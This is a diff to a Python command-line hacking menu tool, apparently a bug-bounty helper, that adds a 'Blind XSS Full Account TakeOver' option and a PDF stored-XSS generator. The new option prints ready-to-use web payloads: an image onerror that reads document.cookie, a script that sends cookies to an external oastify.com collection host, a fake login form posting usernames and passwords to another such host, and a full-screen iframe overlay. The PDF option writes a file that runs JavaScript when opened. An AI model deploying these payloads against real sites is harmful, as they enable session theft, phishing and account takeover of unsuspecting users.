@@ -11,7 +11,7 @@ colorama.init(autoreset=True)
 main_screen = rf"""
 {Fore.RED}██╗  ██╗{Fore.BLUE}██████╗ ██╗   ██╗ ██████╗
 {Fore.RED}╚██╗██╔╝{Fore.BLUE}██╔══██╗██║   ██║██╔════╝ 
-{Fore.RED} ╚███╔╝ {Fore.BLUE}██████╔╝██║   ██║██║  ███╗  {Fore.WHITE}Version = {Fore.GREEN}1.0{Fore.WHITE}
+{Fore.RED} ╚███╔╝ {Fore.BLUE}██████╔╝██║   ██║██║  ███╗  {Fore.WHITE}Version = {Fore.GREEN}1.1{Fore.WHITE}
 {Fore.RED} ██╔██╗ {Fore.BLUE}██╔══██╗██║   ██║██║   ██║  {Fore.WHITE}Lastest Version: {Fore.GREEN}True{Fore.WHITE}
 {Fore.RED}██╔╝ ██╗{Fore.BLUE}██████╔╝╚██████╔╝╚██████╔╝
 {Fore.RED}╚═╝  ╚═╝{Fore.BLUE}╚═════╝  ╚═════╝  ╚═════╝ 
@@ -29,7 +29,7 @@ if main_load == "1":
         main_menu_screen = rf"""
         {Fore.RED}██╗  ██╗{Fore.BLUE}██████╗ ██╗   ██╗ ██████╗
         {Fore.RED}╚██╗██╔╝{Fore.BLUE}██╔══██╗██║   ██║██╔════╝ 
-        {Fore.RED} ╚███╔╝ {Fore.BLUE}██████╔╝██║   ██║██║  ███╗  {Fore.WHITE}Version = {Fore.GREEN}1.0 
+        {Fore.RED} ╚███╔╝ {Fore.BLUE}██████╔╝██║   ██║██║  ███╗  {Fore.WHITE}Version = {Fore.GREEN}1.1 
         {Fore.RED} ██╔██╗ {Fore.BLUE}██╔══██╗██║   ██║██║   ██║  {Fore.WHITE}Lastest Version: {Fore.GREEN}True
         {Fore.RED}██╔╝ ██╗{Fore.BLUE}██████╔╝╚██████╔╝╚██████╔╝
         {Fore.RED}╚═╝  ╚═╝{Fore.BLUE}╚═════╝  ╚═════╝  ╚═════╝ 
@@ -39,7 +39,9 @@ if main_load == "1":
 
         [{Fore.RED}0{Fore.BLUE}1{Fore.WHITE}] Access {Fore.RED}404{Fore.WHITE} files of any server
         [{Fore.RED}0{Fore.BLUE}2{Fore.WHITE}] {Fore.YELLOW}JavaScript {Fore.WHITE}Recon Masterclass {Fore.RED}( Hard To Use # Static ){Fore.WHITE}
-        [{Fore.RED}0{Fore.BLUE}3{Fore.WHITE}] {Fore.RED}WayBackArchive {Fore.YELLOW}Instant
+        [{Fore.RED}0{Fore.BLUE}3{Fore.WHITE}] {Fore.RED}WayBackArchive {Fore.YELLOW}Instant{Fore.WHITE}
+        [{Fore.RED}0{Fore.BLUE}4{Fore.WHITE}] {Fore.GREEN}Blind XSS {Fore.WHITE}Full {Fore.RED}Account{Fore.WHITE} TakeOver {Fore.RED}( Tutorial ){Fore.WHITE}
+        [{Fore.RED}0{Fore.BLUE}5{Fore.WHITE}] {Fore.YELLOW}PDF {Fore.WHITE}Stored {Fore.GREEN}XSS{Fore.WHITE}
         """
         print(main_menu_screen)
         main_menu_screen_choice = input("</#root\> ")
@@ -81,7 +83,7 @@ if main_load == "1":
             input(f"{Fore.BLUE}Press Enter to go back{Fore.RED}...")
             os.system('cls' if os.name == 'nt' else 'clear')
 
-        if main_menu_screen_choice == "3":
+        elif main_menu_screen_choice == "3":
             print(f"Please wait 2 seconds{Fore.RED}...")
             time.sleep(2)
             website_target = input("Website ( Target ): ")
@@ -89,5 +91,44 @@ if main_load == "1":
             time.sleep(2)
             webbrowser.open(url)
             os.system('cls' if os.name == 'nt' else 'clear')
+            input(f"{Fore.BLUE}Press Enter to go back{Fore.RED}...")
+            os.system('cls' if os.name == 'nt' else 'clear')
+
+        elif main_menu_screen_choice == "4":
+            print("""
+            HTMLi:
+            <font color="red">ERROR 1064 (42000): You have an error in your SQL syntax;
+
+            RXSS:
+            <img src/onerror=prompt(document.cookie)>
+
+            IFrame:
+            "><iframe src="https://www.cia.gov/" style="border: 0; position:fixed; top:0; left:0; right:0; bottom:0; width:100%; height:100%">
+
+            ATO:
+            <img src=x  onerror="document.location='http://o0p70yehe4avf6728g095671asgj49sy.oastify.com?c='+document.cookie;" />
+
+            PHISHING:
+            <h3>Please login to proceed</h3> <form action=http://zgj49ubrlvka5wgrek9bc0eryi49s0io7.oastify.com>
+            Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br>
+            <input type="submit" value="Login"></br>
+
+            For Account Takeover Great Website: https://xss.report/dashboard
+            """)
+            input(f"{Fore.BLUE}Press Enter to go back{Fore.RED}...")
+            os.system('cls' if os.name == 'nt' else 'clear')
+
+        elif main_menu_screen_choice == "5":
+            pdf_say = input("What do you want pdf to say: ")
+            pdf_code = f"""%PDF-1.7
+        1 0 obj
+        << /Pages 1 0 R /OpenAction 2 0 R >>
+        2 0 obj
+        << /S /JavaScript /JS (app.alert("{pdf_say}")) >>
+        trailer << /Root 1 0 R >>
+            """
+    
+            with open("pdf_xss.pdf", "w") as pdf_file:
+                pdf_file.write(pdf_code)
             input(f"{Fore.BLUE}Press Enter to go back{Fore.RED}...")
             os.system('cls' if os.name == 'nt' else 'clear')
